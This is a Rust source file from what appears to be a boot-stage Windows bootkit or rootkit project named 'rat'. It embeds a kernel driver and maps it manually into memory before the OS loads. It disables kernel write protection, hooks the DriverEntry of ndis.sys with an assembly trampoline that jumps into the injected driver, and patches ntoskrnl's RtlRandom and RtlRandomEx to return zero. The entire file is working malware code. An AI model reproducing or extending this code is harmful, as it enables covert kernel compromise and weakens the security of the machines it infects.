use core::arch::global_asm;
use core::slice;

use log::{error, info, warn};
use rat_common::kernel::KernelHandoff;
use windows_sys::w;

use crate::patcher::return_zero_patch;
use crate::utils;
use crate::utils::types::_LIST_ENTRY;
use crate::utils::{mapper, pe};

#[cfg(debug_assertions)]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/debug/rat_driver_package/rat_driver.sys");

#[cfg(not(debug_assertions))]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/release/rat_driver_package/rat_driver.sys");

const TARGET_HOOKED_DRIVER: *const u16 = w!("ndis.sys");

global_asm!(
    ".global DriverEntryHooked_trampoline",
    "DriverEntryHooked_trampoline:",
    "movabs r8, 0",  // extra: *const KernelHandoff
    "movabs rax, 0", // Entrypoint of DRIVER
    "jmp rax",
    ".global DriverEntryHooked_trampoline_end",
    "DriverEntryHooked_trampoline_end:",
);

unsafe extern "win64" {
    fn DriverEntryHooked_trampoline();
    fn DriverEntryHooked_trampoline_end();
}

pub fn patch_ntoskrnl(
    ntoskrnl: &mut [u8],
    empty_buffer: &mut [u8],
    load_order_list_head: &_LIST_ENTRY,
) {
    info!("Patching ntoskrnl.exe...");

    if empty_buffer.is_empty() {
        warn!("No usuable buffer is provided. No ntoskrnl hooks will be installed.");
        return;
    }

    let mapping = match unsafe { mapper::manual_map(DRIVER, load_order_list_head, empty_buffer) } {
        Some(mapping) => {
            info!(
                "Mapped kernel driver to allocated buffer, bytes on disk = {}, bytes in memory = 0x{:X} ({}), entrypoint offset = 0x{:X}",
                DRIVER.len(),
                mapping.size,
                mapping.size,
                mapping.entrypoint,
            );

            mapping
        }
        None => {
            error!("Cannot map kernel driver to allocated buffer");
            return;
        }
    };

    match unsafe { utils::get_boot_loaded_module(load_order_list_head, TARGET_HOOKED_DRIVER) } {
        Some(injected_driver) => {
            let entrypoint = injected_driver.kldr_entry.EntryPoint as *mut u8;
            info!("Patching target driver entrypoint at {entrypoint:p}");
            info!("First 32 bytes: {:02X?}", unsafe {
                slice::from_raw_parts(entrypoint, 32)
            });

            let trampoline = utils::get_function_code(
                DriverEntryHooked_trampoline as *const u8,
                DriverEntryHooked_trampoline_end as *const u8,
            );
            info!(
                "DriverEntry hook trampoline ({} bytes): {:02X?}",
                trampoline.len(),
                trampoline,
            );

            let cr0 = utils::DisableWriteProtection::new();
            let driver_image_base = empty_buffer.as_ptr() as u64;
            let empty_buffer = &mut empty_buffer[mapping.size..];
            unsafe {
                let size = trampoline.len();
                let entrypoint = slice::from_raw_parts_mut(entrypoint, size);

                // Save original instructions to empty buffer
                empty_buffer[..size].copy_from_slice(entrypoint);

                // Construct KernelHandoff struct
                let handoff = KernelHandoff {
                    original_driver_entry: entrypoint.as_ptr() as *mut u8,
                    original_instructions: empty_buffer.as_ptr(),
                    original_instructions_len: size,
                };
                let empty_buffer = &mut empty_buffer[size..];
                empty_buffer
                    .as_mut_ptr()
                    .cast::<KernelHandoff>()
                    .write_unaligned(handoff);

                // Patching imm64 addresses
                entrypoint.copy_from_slice(trampoline);
                entrypoint[2..10].copy_from_slice(&(empty_buffer.as_ptr() as u64).to_le_bytes());
                entrypoint[12..20].copy_from_slice(
                    &driver_image_base
                        .saturating_add(u64::from(mapping.entrypoint))
                        .to_le_bytes(),
                );

                info!("DriverEntry hook installed: {entrypoint:02X?}");
            }
            drop(cr0);
        }
        None => {
            warn!("No injected driver provided. DriverEntry hook will not be installed.");
            return;
        }
    }

    unsafe {
        pe::iterate_export_address_table_mut(ntoskrnl, |name, function| {
            if name == c"RtlRandom" || name == c"RtlRandomEx" {
                let patched = return_zero_patch();
                function[..patched.len()].copy_from_slice(patched);
                info!(
                    "Patched function {name:?} at address {:p}",
                    function.as_ptr()
                );
            }
        });
    }
}
